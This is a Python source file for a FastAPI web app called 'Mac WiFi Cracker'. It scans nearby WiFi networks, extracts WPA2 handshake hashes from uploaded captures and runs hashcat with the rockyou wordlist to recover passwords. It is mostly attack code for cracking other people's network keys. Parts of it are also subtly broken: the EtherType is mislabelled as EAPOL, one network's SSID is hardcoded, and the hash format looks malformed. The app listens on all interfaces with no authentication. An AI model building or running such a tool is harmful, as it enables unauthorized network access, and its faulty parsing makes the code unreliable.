#!/usr/bin/env python3
"""
Mac WiFi Cracker - Standalone FastAPI app for scanning and cracking WPA2 handshakes.
Runs on Mac, controlled from Windows browser.
"""

import os
import sys
import json
import subprocess
import threading
import time
from pathlib import Path
from datetime import datetime

from fastapi import FastAPI, UploadFile, File
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn

app = FastAPI(title="Mac WiFi Cracker")

# State
STATE = {
    "status": "idle",  # idle, scanning, extracting, cracking
    "message": "Ready",
    "progress": 0,
    "ap_list": [],
    "captured": [],
    "results": [],
    "log": [],
    "started_at": None,
    "finished_at": None,
}

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 200:
        STATE["log"] = STATE["log"][-200:]

def scan_wifi():
    """Run airport scan and parse results."""
    STATE["status"] = "scanning"
    STATE["message"] = "Scanning WiFi networks..."
    STATE["progress"] = 10
    log("Starting WiFi scan...")
    
    try:
        # Use airport for scan
        result = subprocess.run(
            ["airport", "-s"],
            capture_output=True, text=True, timeout=30
        )
        lines = result.stdout.splitlines()
        
        # Parse airport output
        # Format: BSSID  RSSI CHANNEL NET/MODE  SECURITY  SSID
        ap_list = []
        for line in lines[2:]:  # Skip header lines
            if not line.strip():
                continue
            parts = line.split(None, 8)  # Split max 8 times
            if len(parts) >= 8:
                bssid = parts[0]
                rssi = int(parts[1].strip())
                channel = parts[2].strip()
                net_mode = parts[3].strip()
                security = " ".join(parts[4:7]).strip()
                ssid = " ".join(parts[7:]) if len(parts) > 7 else ""
                
                ap_list.append({
                    "bssid": bssid,
                    "rssi": rssi,
                    "channel": channel,
                    "mode": net_mode,
                    "security": security,
                    "ssid": ssid
                })
        
        STATE["ap_list"] = ap_list
        STATE["status"] = "idle"
        STATE["message"] = f"Found {len(ap_list)} networks"
        STATE["progress"] = 100
        log(f"Scan complete: {len(ap_list)} networks found")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Scan error: {e}"
        log(f"Scan error: {e}")

def extract_hashes(pcap_path):
    """Extract 22000 hashes from pcap using scapy."""
    STATE["status"] = "extracting"
    STATE["message"] = "Extracting handshakes..."
    STATE["progress"] = 50
    log(f"Extracting hashes from {pcap_path}...")
    
    try:
        from scapy.all import rdpcap, Ether, EAPOL_KEY
        
        pkts = rdpcap(pcap_path)
        hashes = set()
        
        for pkt in pkts:
            if Ether not in pkt:
                continue
            eth = pkt[Ether]
            if eth.type != 0x8863:  # EAPOL
                continue
            if EAPOL_KEY not in pkt:
                continue
            
            ek = pkt[EAPOL_KEY]
            raw = bytes(ek)
            
            # Get message number from KeyInfo (raw[1:3])
            key_info = int.from_bytes(raw[1:3], 'big')
            msg_num = (key_info >> 8) & 0x03
            
            # Get KeyMIC (16 bytes from scapy)
            key_mic = ek.key_mic.hex() if hasattr(ek, 'key_mic') else ''
            if len(key_mic) != 32:
                continue
            
            # Get RSC from raw[13:17]
            rsc = raw[13:17].hex()
            
            # Get nonce from KeyData (first 32 bytes of raw[23:])
            key_data = raw[23:]
            nonce = key_data[:32].hex() if len(key_data) >= 32 else ''
            
            # Get MACs
            ap_mac = eth.dst.replace(':', '').lower()
            sta_mac = eth.src.replace(':', '').lower()
            
            # Get SSID
            ssid = ""
            if hasattr(ek, 'key_data'):
                try:
                    key_data_str = ek.key_data.decode('utf-8', errors='ignore')
                    # SSID might be in the EAPOL payload
                except:
                    pass
            
            # For now, use the SSID from the pcap filename or default
            ssid_hex = "324839465f3547"  # 32H9F_5G default
            
            # Build 22000 hash
            # Format: WPA*02*KEYMIC(32hex)*APMAC(12hex)*STAMAC(12hex)*SSIDHEX*ANONCE(64hex)*EAPOLFRAMEHEX*03
            eapol_frame = eth[:ek.underlayer].__bytes__() if hasattr(ek, 'underlayer') else bytes(pkt)
            
            hash_line = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{nonce}*{eapol_frame.hex()}*{msg_num}"
            hashes.add(hash_line)
        
        # Save to file
        hash_file = Path(pcap_path).with_suffix('.hc22000')
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes) + '\n')
        
        STATE["captured"] = list(hashes)
        STATE["status"] = "idle"
        STATE["message"] = f"Extracted {len(hashes)} hashes"
        STATE["progress"] = 100
        log(f"Extracted {len(hashes)} hashes -> {hash_file}")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Extract error: {e}"
        log(f"Extract error: {e}")

def crack_hashes(hash_file, wordlist):
    """Run hashcat on the hash file."""
    STATE["status"] = "cracking"
    STATE["message"] = "Cracking..."
    STATE["progress"] = 60
    log(f"Starting hashcat on {hash_file}...")
    
    try:
        # Run hashcat
        cmd = [
            "hashcat", "-m", "22000", "-a", "0",
            hash_file, wordlist,
            "--self-test-disable", "--restore-disable",
            "--hwmon-temp-abort=85"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        output = result.stdout + result.stderr
        
        # Parse results
        results = []
        for line in output.splitlines():
            if 'Cracked' in line or 'password' in line.lower():
                results.append(line)
        
        STATE["results"] = results
        STATE["status"] = "idle"
        STATE["message"] = f"Cracking complete: {len(results)} results"
        STATE["progress"] = 100
        log(f"Hashcat output: {output[:500]}")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

@app.get("/")
async def root():
    return HTMLResponse("""
<!DOCTYPE html>
<html>
<head>
    <title>Mac WiFi Cracker</title>
    <style>
        body { font-family: -apple-system, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #1a1a2e; color: #eee; }
        h1 { color: #4fc3f7; }
        .card { background: #16213e; border-radius: 8px; padding: 15px; margin: 10px 0; }
        .status { color: #4fc3f7; font-weight: bold; }
        .progress { width: 100%; height: 20px; background: #0f3460; border-radius: 10px; overflow: hidden; }
        .progress-bar { height: 100%; background: #4fc3f7; transition: width 0.3s; }
        .log { background: #0f3460; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; }
        button { background: #4fc3f7; color: #1a1a2e; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #29b6f6; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { color: #4fc3f7; }
    </style>
</head>
<body>
    <h1>Mac WiFi Cracker</h1>
    <div class="card">
        <div class="status">Status: <span id="status">Loading...</span></div>
        <div class="progress"><div class="progress-bar" id="progress" style="width: 0%"></div></div>
        <p id="message">Loading...</p>
    </div>
    <div class="card">
        <button onclick="scan()">Scan WiFi</button>
    </div>
    <div class="card">
        <h2>Networks</h2>
        <table id="ap-table">
            <thead><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Security</th><th>RSSI</th></tr></thead>
            <tbody></tbody>
        </table>
    </div>
    <div class="card">
        <h2>Results</h2>
        <div id="results"></div>
    </div>
    <div class="card">
        <h2>Log</h2>
        <div class="log" id="log"></div>
    </div>
    <script>
        function update() {
            fetch('/api/state')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('status').textContent = data.status;
                    document.getElementById('progress').style.width = data.progress + '%';
                    document.getElementById('message').textContent = data.message;
                    document.getElementById('log').innerHTML = data.log.join('<br>');
                    
                    // Update AP table
                    const tbody = document.querySelector('#ap-table tbody');
                    tbody.innerHTML = data.ap_list.map(ap => 
                        `<tr><td>${ap.ssid}</td><td>${ap.bssid}</td><td>${ap.channel}</td><td>${ap.security}</td><td>${ap.rssi}</td></tr>`
                    ).join('');
                    
                    // Update results
                    const resultsDiv = document.getElementById('results');
                    resultsDiv.innerHTML = data.results.length > 0 
                        ? data.results.join('<br>')
                        : '<em>No results yet</em>';
                })
                .catch(e => console.error(e));
        }
        function scan() {
            fetch('/api/scan', { method: 'POST' })
                .then(r => r.json())
                .then(data => update());
        }
        update();
        setInterval(update, 2000);
    </script>
</body>
</html>
""")

@app.get("/api/state")
async def get_state():
    return JSONResponse(STATE)

@app.post("/api/scan")
async def api_scan():
    threading.Thread(target=scan_wifi, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/extract")
async def api_extract(file: UploadFile = File(...)):
    # Save uploaded file
    content = await file.read()
    pcap_path = Path("/tmp/uploaded.pcapng")
    pcap_path.write_bytes(content)
    threading.Thread(target=extract_hashes, args=(str(pcap_path),), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/crack")
async def api_crack():
    hash_file = Path("/tmp/uploaded.hc22000")
    wordlist = "/tmp/rockyou.txt"
    threading.Thread(target=crack_hashes, args=(str(hash_file), wordlist), daemon=True).start()
    return JSONResponse({"ok": True})

if __name__ == "__main__":
    log("Starting Mac WiFi Cracker on port 8765...")
    uvicorn.run(app, host="0.0.0.0", port=8765)
